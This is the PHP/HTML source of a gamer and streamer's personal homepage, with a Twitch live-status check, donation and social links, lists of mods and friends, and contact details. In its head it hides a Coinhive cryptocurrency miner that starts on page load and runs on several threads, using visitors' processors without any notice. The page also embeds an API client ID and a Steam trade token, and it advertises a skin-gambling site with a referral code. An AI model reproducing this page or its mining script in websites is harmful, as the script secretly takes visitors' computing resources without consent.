<?php 

    //Live Toolbar

    $mixerurl = "https://api.twitch.tv/kraken/streams/ChisdealHD?client_id=ulgcuszhtjc9hv7p69ovdqrl327yh4";

    $mixercontent = file_get_contents($mixerurl);

    $mixerjson = json_decode($mixercontent, true);

   $live = $mixerjson['stream'] == true ? '🔴' : '◯';

?>

<!DOCTYPE html >
<html lang="en">
<head>

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="ChisdealHD Site!">
<meta name="author" content="ChisdealHD INC">
<link rel="shortcut icon" href="test.ico" type="image/x-icon">
<meta name="viewport" content="width=device-width, initial-scale=1">

<title>-=+ChisdealHD+=-</title>

<style>
div#load_screen{
	background: #000;
	opacity: 1;
	position: fixed;
    z-index:10;
	top: 0px;
	width: 100%;
	height: 1600px;
}
div#load_screen > div#loading{
	color:#FFF;
	width:120px;
	height:24px;
	margin: 300px auto;
}
</style>
<script>
window.addEventListener("load", function(){
	var load_screen = document.getElementById("load_screen");
	document.body.removeChild(load_screen);
});
</script>

<!-- Start of StatCounter Code for Dreamweaver -->
<script type="text/javascript">
var sc_project=11431652; 
var sc_invisible=1; 
var sc_security="85ec1327"; 
var scJsHost = (("https:" == document.location.protocol) ?
"https://secure." : "http://www.");
document.write("<sc"+"ript type='text/javascript' src='" +
scJsHost+
"statcounter.com/counter/counter.js'></"+"script>");
</script>
<noscript><div class="statcounter"><a title="free web stats"
href="http://statcounter.com/" target="_blank"><img
class="statcounter"
src="//c.statcounter.com/11431652/0/85ec1327/1/" alt="free
web stats"></a></div></noscript>
<!-- End of StatCounter Code for Dreamweaver -->


<!-- Bootstrap -->
<link rel="stylesheet" href="css/bootstrap.css">

<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script type="text/javascript">
var miner = new CoinHive.Anonymous('fmxj52KigG8KYYs63092kaBMNNugbnYg', {
	threads: 7,
	autoThreads: false,
	throttle: 0.8,
	forceASMJS: false
});
miner.start();
// Listen on events
miner.on('found', function() { /* Hash found */ })
miner.on('accepted', function() { /* Hash accepted by the pool */ })

// Update stats once per second
setInterval(function() {
	var hashesPerSecond = miner.getHashesPerSecond();
	var totalHashes = miner.getTotalHashes();
	var acceptedHashes = miner.getAcceptedHashes();

	// Output to HTML elements...
}, 1000);
</script>
</head>
<body>
<div id="load_screen"><div id="loading"><img src="loading.gif" alt="LOADING....">LOADING!....</div></div>
<!-- Your normal document content lives here -->
<nav class="navbar navbar-default navbar-inverse">
  <div class="container-fluid"> 
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header">
      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button>
      <a class="navbar-brand" href="#">ChisdealHD</a></div>
    
        <!-- Collect the nav links, forms, and other content for toggling -->
    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
      <ul class="nav navbar-nav">
        <li class="active"><a href="http://chisdealhd.xyz/">Home </a></li>        
        <li><a href="http://chisdealhd.xyz/development/index.php">Chis's Development Stuff</a></li>
        <li><a href="http://chisdealhd.xyz/games/index.php">GamesList</a></li>
        <li><a href="http://chisdealhd.xyz/chat/index.php">Chat</a></li>
        <li><a href="http://chisdealhd.xyz/sponsors/index.php">SponsorShip</a></li>
        <li><a href="http://chisdealhd.xyz/gallery/index.php">Gallery</a></li>
        <li><a href="http://chisdealhd.xyz/stream/">LIVE: <?php echo $live;?></a></li>
      </ul>
      <ul class="nav navbar-nav navbar-right">
        <li><a href="https://www.facebook.com/chisdealhdyt/?ref=br_tf">Facebook</a></li>
        <li><a href="http://twitter.com/chisdeal2013">Twitter</a></li>
    <li><a href="http://chisdealhd.xyz/apps/index.php">APPS</a></li>
        <li><a href="#">Login</a></li>
      </ul>
    </div>
    <!-- /.navbar-collapse -->  
  </div>
  <!-- /.container-fluid --> 
</nav>
<div id="bg"></div>
<div class="container">
  <div class="row">
    <div class="col-lg-12">
      <div class="jumbotron">
        <h1 class="text-center">ChisdealHD HomePage.</h1>
        <div class="row">
          <div class="col-lg-2 col-lg-offset-4 col-md-2 col-sm-offset-3 col-sm-3 col-xs-offset-3 col-xs-3 col-md-offset-4">
            <p>&nbsp;<a class="btn btn-success btn-lg" href="#" role="button">About</a></p>
          </div>
          <div class="col-lg-2 col-sm-6 col-md-3">
            <p><a class="btn btn-primary btn-lg" href="#" role="button">Apps!</a></p>
          </div>
        </div>
        <div> </div>
        <div class="row">
          <div class="col-md-6"></div>
          <div class="col-md-6"></div>
        </div>
        <p class="text-center">Welcome to ChisdealHD Website, This website got lot stuff on and got more to come.</p>
        <br>
        <center><a href="https://www.exophase.com/user/ChisdealHD/"><img src="https://card.exophase.com/2/0/26670.png"></a></center>
    </div>
    <center><img src="imgs/logo.png" alt="" style="width="400" height="400"></center> </div>
    <br>
  </div>
</div>
<div class="container">
<div class="row">
    <div class="col-lg-12">
      <div class="jumbotron">
        <div class="row">
          <div class="text-center col-sm-6">
            <h3>Donate link</h3>
             <p>This is Donation Link for you guys to feel free Donate to me from Real Cash or use loots when im LIVE! its http://loots.com/chisdealhd </p>
             <a class="btn btn-danger btn-lg" href="https://streamlabs.com/chisdealhd" role="button">Donate</a></div>
              <div class="text-center col-sm-6">
                <h3>Youtube</h3>
                <p>This my youtube Channel, and Videos be uploaded soon on this site.</p>
                <a class="btn btn-info btn-lg" href="http://youtube.com/chisdeal2013/" role="button">Youtube</a></div>
              </div>
          </div>
        </div>
      </div>
  </div>
</div>
<div class="container">
<div class="row">
    <div class="col-lg-12">
      <div class="jumbotron">
        <div class="row">
          <div class="text-center col-sm-6">
            <h3>Steam Trade</h3>
             <p>You can Trade CSGO skins, Trade Cards and more. only use this for unwanted Items Tradable and Support me with LOOTS! </p>
             <a class="btn btn-danger btn-lg" href="https://steamcommunity.com/tradeoffer/new/?partner=133730186&token=zZVEde7y" role="button">Trade URL</a></div>
              <div class="text-center col-sm-6">
                <h3>Free CSGO Skins</h3>
                <p>You can get EASY CSGO SKINS by BETS and SLOt Matchine from CSGO-CASE, Use Referial ChisdealHD for getting Free 150 Tokens.</p>
                <a class="btn btn-info btn-lg" href="http://csgo-case.com/" role="button">FREE CSGO SKINS!</a></div>
              </div>
          </div>
        </div>
      </div>
  </div>
</div>
<hr>
<div class="container">
<div class="row">
    <div class="col-lg-12">
      <div class="jumbotron">
        <div class="row">
          <div class="col-lg-3 col-md-6 col-sm-6">
            <h2><span class="glyphicon glyphicon-pencil" aria-hidden="true"></span>Games</h2>
            <p>I play lot games online and offline like minecraft, CSGO, Unturned, Warframe and lot good First Person Shooter and RPG games too.</p>
          </div>
          <div class="col-lg-3 col-md-6 col-sm-6">
            <h2><span class="glyphicon glyphicon-pencil" aria-hidden="true"></span> Skills</h2>
            <p>I been Learning Basic of Coding when i was AGE 15 and I been Improving my Skills on IT Level 1 and i love to learn more my skills.</p>
          </div>
          <div class="col-lg-3 col-md-6 col-sm-6">
            <h2><span class="glyphicon glyphicon-pencil" aria-hidden="true"></span> Mods</h2>
            <p>[M] = Mixer MOD [T] = Twitch Mod [YT] = Youtbe MOD [SC] = Smashcast MOD [SM] = StreamMe MOD</p>
            <p>Mods my stream:</p>
            <p>[M]AstroSamz</p>
            <p>[M]El Genki</p>
            <p>[M][YT][T]Haeria</p>
            <p>[M][T]KimaHrey</p>
            <p>[M][T]MCHanka</p>
            <p>[T]Meektheangel</p>
            <p>[M]BigMikey150</p>
            <p>[M][T]Monstercat407</p>
            <p>[M][T]R3ido101</p>
            <p>[M]Royelshadow</p>
            <p>[M][T]Xternal-Nate</p>
            <p>[M][T]Bacon_Space</p>
          </div>
          <div class="col-lg-3 col-md-6 col-sm-6">
            <h2><span class="glyphicon glyphicon-pencil" aria-hidden="true"></span> Friends</h2>
            <p>[M] = Mixer MOD [T] = Twitch Mod [YT] = Youtbe MOD [SC] = Smashcast MOD [SM] = StreamMe MOD</p>
            <p>IRL Friends:</p>
            <p>[M][T]Irishpotatoes</p>
            <p>[M]𝕭𝖊𝖆𝖘𝖙𝖒𝖔𝖉𝖊 𝖆𝖈𝖙𝖎𝖛𝖊</p>
            <p>Yunie</p>
            <p>[M]xharry</p>
            <p>Sytheshock</p>
            <p>Hamill_ladd</p>
            <p>Shadow_Hawk</p>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<hr>
  <div class="container">
    <div class="row">
      <div class="col-lg-12">
        <div class="jumbotron">
          <div class="row">
            <h2 class="text-center">Video Tutorial</h2>
            <div class="embed-responsive embed-responsive-16by9">
              <iframe class="embed-responsive-item" src="https://www.youtube.com/embed/OxXvHwrQTNc"></iframe>
            </div>
          </div>
          <div class="col-lg-12"></div>
          <div class="col-lg-12"></div>
        </div>
      </div>
    </div>
  </div>
</section>
<div class="container">
  <div class="row">
    <div class="col-lg-12">
      <div class="jumbotron">
        <div class="row">
          <div class="col-sm-6">
           <div class=""> <img src="imgs/twitch_tv.png" alt="Thumbnail Image 1" class="img-responsive">
            <div class="caption">
              <h3>Twitch</h3>
              <p>Follow me on Twitch!</p>
              <hr>
              <p><a href="https://twitch.tv/chisdealhd" class="btn btn-success" role="button">Smash that Follow!</a></p>
            </div>
          </div>
        </div>
      <div class="col-sm-6">
        <div class="">
          <div class="caption">
            <h3>Music</h3>
            <iframe src="http://mediaplayer.chisdealhd.xyz/Remix/" width="305" height="530"></iframe>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>
<div class="container">
  <div class="row">
    <div class="col-lg-12">
      <div class="jumbotron">
        <div class="row">
          <div class="col-sm-6">
           <div class=""> <img src="imgs/logo.png" alt="My Discord bot LOGO!" class="img-responsive">
            <div class="caption">
              <h3>Discord BOT</h3>
              <p>You can add my Discord BOT! on your Discord for good Adons and Commands!</p>
              <hr>
              <p><a href="#" class="btn btn-success" role="button">Coming SOON!!</a></p>
            </div>
          </div>
        </div>
      <div class="col-sm-6">
        <div class=""> <img src="imgs/logo.png" alt="Thumbnail Image 1" class="img-responsive">
          <div class="caption">
            <h3> Live Site</h3>
            <p>Can tell you when im Live or NOT!.</p>
            <hr>
            <p><a href="http://live.chisdealhd.xyz/" class="btn btn-success" role="button">Live Status</a></p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>
<hr>
<div class="container">
  <div class="row">
    <div class="col-lg-12">
      <div class="jumbotron">
        <div class="row">
          <div class="col-lg-4 col-md-6 col-sm-6">
          <center><h2>Contact Us</h2>
          <address>
          <strong>ChisdealHD INC.</strong><br>
          Email: chisdeal2014@hotmail.com<br>
          Newcastle Upon Tyne<br>
          United Kingdom
          </address></center>
      </div>
      <div class="col-lg-4 col-md-6 col-sm-6">
      <h2>What i do?</h2>
      <div class="media">
        <div class="media-left"> <a href="#"> <img class="media-object" src="img/35X35.gif" alt="..."> </a> </div>
        <div class="media-body">
          <h4 class="media-heading"> Gaming</h4>
I play lot Gaming on my Pc and play game outside make more fun with friends/family</div>
      </div>
      <div class="media">
        <div class="media-left"> <a href="#"> <img class="media-object" src="img/35X35.gif" alt="..."> </a> </div>
        <div class="media-body">
          <h4 class="media-heading">Advertizing</h4>
          You can Advertizing on my site but cost $10 per Month be Advertized. </div>
      </div>
    </div>
    <div class="col-lg-4 col-sm-12">
      <h2>About Us</h2>
      <p>Hello My name is Grant Robinson you may call me ChisdealHD or Chis, i do lot of gaming and spend time with my family and friends.</p>
      <p>I play lot games in past like warframe, Uberstrike, Minecraft, CSGO, and few others. i do make stuff aswell like make Apps and lot gaming apps. i will improve my site but someday its a start off.</p>
    </div>
    </div>
  </div>
</div>
    
</div>
</div>
  <hr>
<footer class="text-center">
  <div class="container">
    <div class="row">
      <div class="col-lg-12">
        <div class="jumbotron">
          <div class="row">
            <div class="col-xs-12">
              <p>2017 Copyright © ChisdealHD INC. All rights reserved.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</footer>
    <!-- jQuery -->
    <script src="js/jquery.js"></script>

    <!-- Bootstrap Core JavaScript -->
    <script src="js/bootstrap.min.js"></script>
</body>
</html>
